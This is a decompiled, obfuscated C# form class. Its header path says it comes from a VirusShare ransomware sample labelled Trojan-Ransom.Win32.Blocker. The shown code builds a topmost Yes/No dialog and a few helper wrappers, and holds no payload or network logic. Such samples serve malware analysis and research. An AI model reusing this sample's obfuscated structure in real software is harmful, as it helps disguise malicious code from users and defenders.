// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႳႭ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.Attributes;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.IsolatedStorage;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ⴈ
{
  internal sealed class ႳႭ : Form
  {
    private ႷႼ.Ⴅ Ⴄ;

    protected override void Dispose(bool Ⴃ)
    {
      int num;
      try
      {
        try
        {
          num = 3;
          while (true)
          {
            switch (num)
            {
              case 0:
                num = this.Ⴄ.Ⴍ == null ? 2 : 4;
                continue;
              case 1:
              case 4:
                goto label_4;
              case 2:
              case 5:
                goto label_5;
              default:
                num = !Ⴃ ? 2 : 0;
                continue;
            }
          }
label_4:
          this.Ⴄ.Ⴍ.Dispose();
label_5:
          base.Dispose(Ⴃ);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o2 = (ValueType) Ⴃ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o3 = (ValueType) Ⴃ;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
        throw;
      }
    }

    private void Ⴅ()
    {
      int num1;
      ComponentResourceManager componentResourceManager;
      Label label;
      Button button1;
      Button button2;
      try
      {
        try
        {
          num1 = 14;
          while (true)
          {
            switch (num1)
            {
              case 0:
                Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴃ, new Point(12, 16), 762, 721);
                num1 = 16;
                continue;
              case 2:
                ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴗ, new Size(299, 33), 417, 407);
                num1 = 25;
                continue;
              case 3:
                this.Ⴄ.Ⴗ.UseVisualStyleBackColor = true;
                this.AutoScaleDimensions = new SizeF(6f, 13f);
                num1 = 33;
                continue;
              case 4:
                this.FormBorderStyle = FormBorderStyle.FixedSingle;
                this.MaximizeBox = false;
                this.MinimizeBox = false;
                this.Name = ႳႷ.Ⴗ(2059790348, 3);
                num1 = 24;
                continue;
              case 5:
                goto label_35;
              case 6:
                SmartAssembly.License.License.Ⴀ((Control) this.Ⴄ.Ⴗ, new Padding(5, 0, 0, 0), 486, 394);
                num1 = 2;
                continue;
              case 7:
                DoNotPruneTypeAttribute.Ⴄ(this.Ⴄ.Ⴗ, DialogResult.No, 377, 275);
                UsageCounts.Ⴐ((ButtonBase) this.Ⴄ.Ⴗ, ContentAlignment.MiddleLeft, 849, 831);
                num1 = 19;
                continue;
              case 8:
                DoNotPruneTypeAttribute.Ⴀ((Control) this.Ⴄ.Ⴈ, ႷႭ.ႥႭ(490613668, 5), 166, 158);
                num1 = 31;
                continue;
              case 9:
                UnhandledExceptionHandlerWithUI.Ⴗ((Control) this, 609, 626);
                DoNotEncodeStringsAttribute.Ⴅ((Control) this.Ⴄ.Ⴃ, true, 877, 804);
                goto case 30;
              case 10:
                DoNotDistributeAttribute.Ⴅ(this.Ⴄ.Ⴃ, true, 349, 377);
                WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴈ, AnchorStyles.Bottom, 141, 150);
                num1 = 15;
                continue;
              case 11:
                this.ClientSize = new Size(504, 190);
                this.ControlBox = false;
                this.Controls.Add((Control) this.Ⴄ.Ⴗ);
                num1 = 18;
                continue;
              case 12:
                DoNotPruneTypeAttribute.Ⴀ((Control) this.Ⴄ.Ⴗ, ႷႭ.ႥႳ(1491049079, 5), 750, 726);
                num1 = 6;
                continue;
              case 13:
                button1 = new Button();
                this.Ⴄ.Ⴈ = button1;
                button2 = new Button();
                this.Ⴄ.Ⴗ = button2;
                num1 = 9;
                continue;
              case 15:
                DoNotPruneTypeAttribute.Ⴄ(this.Ⴄ.Ⴈ, DialogResult.Yes, 745, 643);
                UsageCounts.Ⴐ((ButtonBase) this.Ⴄ.Ⴈ, ContentAlignment.MiddleLeft, 686, 704);
                num1 = 20;
                continue;
              case 16:
                ႳႷ.Ⴍ((Control) this.Ⴄ.Ⴃ, new Size(480, 800), 39, 104);
                num1 = 28;
                continue;
              case 17:
                WaitSendingReportControl.Ⴈ((Control) this.Ⴄ.Ⴃ, 1, 315, 320);
                Ⴈ.Ⴓ.Ⴗ(this.Ⴄ.Ⴃ, true, 718, 764);
                num1 = 21;
                continue;
              case 18:
                this.Controls.Add((Control) this.Ⴄ.Ⴈ);
                this.Controls.Add((Control) this.Ⴄ.Ⴃ);
                num1 = 4;
                continue;
              case 19:
                Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴗ, new Point(97, 144), 910, 933);
                num1 = 12;
                continue;
              case 20:
                Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴈ, new Point(97, 105), 820, 799);
                num1 = 8;
                continue;
              case 21:
                SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴃ, ႷႣ.Ⴐ((ResourceManager) componentResourceManager, ႷႭ.ႥႭ(490613714, 7), 564, 637), 390, 465);
                goto case 23;
              case 22:
                SmartAssembly.License.License.Ⴀ((Control) this.Ⴄ.Ⴃ, new Padding(0, 0, 0, 92), 200, 164);
                num1 = 34;
                continue;
              case 23:
                num1 = 10;
                continue;
              case 24:
                this.ShowInTaskbar = false;
                this.SizeGripStyle = SizeGripStyle.Hide;
                this.StartPosition = FormStartPosition.CenterScreen;
                this.Text = ႷႭ.ႥႭ(490613693, 4);
                num1 = 27;
                continue;
              case 25:
                WaitSendingReportControl.Ⴈ((Control) this.Ⴄ.Ⴗ, 3, 479, 420);
                SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴗ, Ⴈ.Ⴀ.Ⴐ(1468303542, 6), 552, 639);
                num1 = 3;
                continue;
              case 26:
                WaitSendingReportControl.Ⴈ((Control) this.Ⴄ.Ⴈ, 2, 513, 634);
                SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴈ, SimpleZip.Ⴓ(661402890, 1), 34, 117);
                num1 = 32;
                continue;
              case 27:
                goto label_34;
              case 28:
                DoNotPruneTypeAttribute.Ⴀ((Control) this.Ⴄ.Ⴃ, Ⴈ.Ⴀ.Ⴐ(1468303529, 8), 479, 487);
                num1 = 22;
                continue;
              case 29:
                ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴈ, new Size(299, 33), 579, 629);
                num1 = 26;
                continue;
              case 30:
                num1 = 0;
                continue;
              case 31:
                SmartAssembly.License.License.Ⴀ((Control) this.Ⴄ.Ⴈ, new Padding(5, 0, 0, 0), 717, 673);
                num1 = 29;
                continue;
              case 32:
                AppNameFinder.Ⴅ((ButtonBase) this.Ⴄ.Ⴈ, true, 939, 912);
                WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴗ, AnchorStyles.Bottom, 881, 874);
                num1 = 7;
                continue;
              case 33:
                this.AutoScaleMode = AutoScaleMode.Font;
                this.AutoSize = true;
                this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
                this.BackColor = SystemColors.ControlLightLight;
                num1 = 11;
                continue;
              case 34:
                ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴃ, new Size(442, 159), 420, 402);
                num1 = 17;
                continue;
              default:
                // ISSUE: type reference
                componentResourceManager = new ComponentResourceManager(SendingReportFeedbackEventArgs1.Ⴍ(__typeref (ႳႭ), 390, 509));
                label = new Label();
                this.Ⴄ.Ⴃ = label;
                num1 = 13;
                continue;
            }
          }
label_34:
          this.TopMost = true;
          this.ResumeLayout(false);
label_35:
          this.PerformLayout();
        }
        catch (Exception ex)
        {
          ComponentResourceManager o1 = componentResourceManager;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
        switch (4)
        {
        }
      }
      catch (Exception ex)
      {
        ComponentResourceManager o1 = componentResourceManager;
        Label o2 = label;
        Button o3 = button1;
        Button o4 = button2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num2;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this);
        throw;
      }
    }

    public ႳႭ()
    {
      Size size;
      try
      {
        try
        {
          this.Ⴅ();
          Button ⴗ = this.Ⴄ.Ⴗ;
          size = ReportSender.Ⴗ((Form) this, 375, 380);
          int num = ReportSender.Ⴓ(ref size, 152, 242) - 13 - SimpleZip.ႤႨ.Ⴍ((Control) this.Ⴄ.Ⴗ, 795, 846);
          UsageReportSender.Ⴐ((Control) ⴗ, num, 767, 651);
          UsageReportSender.Ⴐ((Control) this.Ⴄ.Ⴈ, SimpleZip.ႤႨ.Ⴍ((Control) this.Ⴄ.Ⴗ, 383, 297) - 6 - SimpleZip.ႤႨ.Ⴍ((Control) this.Ⴄ.Ⴈ, 117, 32), 900, 1008);
          SimpleZip.ႤႨ.Ⴐ((ButtonBase) this.Ⴄ.Ⴈ, (Image) ႳႤ.Ⴅ(Ⴈ.Ⴀ.Ⴐ(1468303591, 5)), 900, 916);
          SimpleZip.ႤႨ.Ⴐ((ButtonBase) this.Ⴄ.Ⴗ, (Image) ႳႤ.Ⴅ(SimpleZip.Ⴓ(661402965, 7)), 129, 145);
          this.Ⴄ.Ⴃ.Text = string.Format(this.Ⴄ.Ⴃ.Text, (object) ႳႨ.Ⴗ, (object) ႳႨ.Ⴍ);
          this.Text = string.Format(this.Text, (object) ႳႨ.Ⴗ);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<Size> o1 = (ValueType) size;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<Size> o1 = (ValueType) size;
        StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
        throw;
      }
    }

    static ႳႭ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static byte[] Ⴃ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 22:
            num2 = 4;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              goto label_8;
            case 1:
            case 2:
              goto label_3;
            case 5:
              num1 = 2;
              continue;
            case 6:
            case 7:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႭ.Ⴃ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.ToArray();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        MemoryStream o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string[] Ⴍ([In] IsolatedStorageFile obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 39:
            num2 = 3;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 5:
              goto label_3;
            case 3:
              goto label_8;
            case 4:
              num1 = 1;
              continue;
            case 6:
            case 7:
              num1 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႭ.Ⴍ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return obj0.GetFileNames(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        IsolatedStorageFile o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string Ⴀ([In] MemberInfo obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 6:
            num2 = 1;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 4;
              continue;
            case 1:
            case 5:
              goto label_8;
            case 3:
              num1 = 4;
              continue;
            case 4:
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႭ.Ⴀ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.Name;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        MemberInfo o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴓ([In] Form obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 3:
              goto label_7;
            case 2:
              goto label_8;
            case 4:
              num1 = 5;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 14:
                  num2 = 3;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.AutoScaleBaseSize = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Form o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Size> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }
  }
}
